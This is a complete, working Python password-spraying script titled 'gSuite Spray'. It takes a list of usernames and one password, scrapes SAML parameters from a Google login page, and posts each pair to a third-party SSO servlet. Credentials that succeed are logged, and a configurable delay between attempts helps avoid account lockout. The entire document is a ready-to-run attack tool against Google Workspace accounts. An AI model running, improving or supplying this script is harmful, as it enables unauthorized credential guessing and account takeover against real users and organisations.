print '''
          _____       _ __          _____                       
   ____ _/ ___/__  __(_) /____     / ___/____  _________ ___  __
  / __ `/\__ \/ / / / / __/ _ \    \__ \/ __ \/ ___/ __ `/ / / /
 / /_/ /___/ / /_/ / / /_/  __/   ___/ / /_/ / /  / /_/ / /_/ / 
 \__, //____/\__,_/_/\__/\___/   /____/ .___/_/   \__,_/\__, /  
/____/                               /_/               /____/   

by jnqpblc
'''

import sys

if len(sys.argv) < 5:
    sys.exit('Usage: %s <userList|~/users.lst> <domain|example.com> <delay_seconds|10> <password|Spring2019> <useBurpProxy|Y|N>\n' % sys.argv[0])

import requests, cookielib, re, time
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

USERLIST = str(sys.argv[1])
DOMAIN = str(sys.argv[2])
DELAY = int(sys.argv[3])
PASSWORD = str(sys.argv[4])
USEBURP = str(sys.argv[5])
UA = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0'

logFile = open("gSuiteSpray.log","a") 

with open(USERLIST, 'rb') as f:
  for USER in f:
    USER = USER.rstrip()

    if len(USER) <= 4:
      continue

    jar = cookielib.CookieJar()
    proxies = {
      "http": "http://127.0.0.1:8080",
      "https": "https://127.0.0.1:8080",
    }

    burp0_url = "https://www.google.com:443/a/" + DOMAIN + "/ServiceLogin?service=mail&passive=true&rm=false&continue=https://mail.google.com/mail/&ss=1&ltmpl=default&ltmplcache=2&emr=1&osid=1"
    burp0_headers = {"User-Agent": UA, "Accept": "*/*", "Connection": "close"}

    if (USEBURP == 'Y') or (USEBURP == 'y'):
      burp0_response = requests.get(burp0_url, headers=burp0_headers, cookies=jar, verify=False, proxies=proxies)
    else:
      burp0_response = requests.get(burp0_url, headers=burp0_headers, cookies=jar, verify=False)

    if burp0_response.status_code == 200:
      SAML = re.search("samlrequest value = ([^>]+)", burp0_response.text, re.IGNORECASE).group(1)
      if not SAML:
        sys.exit('[!] samlrequest regex failed!')
      ENCDOM = re.search("EncryptedDomainName' value = '([^']+)", burp0_response.text, re.IGNORECASE).group(1)
      if not ENCDOM:
        sys.exit('[!] EncryptedDomainName regex failed!')
    else:
      sys.exit('[!] burp0_response failed!')

    burp1_url = "https://gcontrolapp.appspot.com:443/ssomanagerservlet"
    burp1_cookies = {"JSESSIONID": "only_used_for_testing"}
    burp1_headers = {"User-Agent": UA, "Accept": "*/*", "Content-Type": "application/x-www-form-urlencoded", "Connection": "close"}
    burp1_data={"username": USER, "password": PASSWORD, "registerDeviceJSON": "{}", "samlrequest": SAML, "relaystate": "https://www.google.com/a/" + DOMAIN + "/ServiceLogin?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&ltmpl=default&ltmplcache=2&emr=1&osid=1", "domainname": DOMAIN, "EncryptedDomainName": ENCDOM, "isextninstalled": "false", "browsername": "Firefox", "crossextnversion": "notset"}

    if (USEBURP == 'Y') or (USEBURP == 'y'):
      burp1_response = requests.post(burp1_url, headers=burp1_headers, cookies=jar, data=burp1_data, verify=False, proxies=proxies)
    else:
      burp1_response = requests.post(burp1_url, headers=burp1_headers, cookies=jar, data=burp1_data, verify=False)

    if burp1_response.status_code == 200:
      if not "Invalid Login Attempt" in burp1_response.text:
        print "[+] %s : %s was valid!" % (USER, PASSWORD)
        logFile.write("[+] %s : %s was valid!" % (USER, PASSWORD)) 
      else:
        print "[*] %s : %s was invalid." % (USER, PASSWORD)
    else:
      sys.exit('[!] burp1_response failed!')

    if DELAY:
      time.sleep(DELAY)

logFile.close()
